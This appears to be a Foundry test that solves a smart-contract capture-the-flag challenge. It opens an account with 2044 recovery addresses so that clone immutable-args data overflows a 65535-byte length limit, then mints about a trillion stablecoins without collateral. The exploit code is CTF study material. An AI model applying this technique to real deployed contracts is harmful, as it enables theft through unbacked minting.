// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFDeployment.sol";
import "../src/Challenge.sol";
import "../src/AccountManager.sol";
import "forge-std/console.sol";
import {Account as Acct} from "../src/Account.sol";

contract Solve is BaseTest {
    SystemConfiguration internal configuration;
    AccountManager internal manager ;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(system);

        configuration = new SystemConfiguration();
        manager = new AccountManager(configuration);

        vm.label(address(manager), "Manager");
        vm.label(address(configuration), "Configuration");

        configuration.updateAccountManager(address(manager));
        configuration.updateStablecoin(address(new Stablecoin(configuration)));
        configuration.updateAccountImplementation(address(new Acct()));
        configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

        configuration.updateSystemContract(address(manager), true);

        challenge = address(new Challenge(configuration));

        vm.stopBroadcast();
    }

    function test_Expoit() public {
        vm.startBroadcast(player);

        /*
            data cannot exceed 65535 bytes, since 2 bytes are used to store the data length
            uint256 extraLength = data.length + 2; // +2 bytes for telling how much data there is appended to the call
            uint256 creationSize = 0x43(67) + extraLength;
            uint256 runSize = creationSize - 11; 
        */

        address[] memory rAccounts = new address[](2044);
        address account = address(manager.openAccount(player, rAccounts));
        manager.mintStablecoins(Acct(account), 1_000_000_000_001 ether, '');
    
        vm.stopBroadcast();

        assert(validation());
    }

    function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }
}
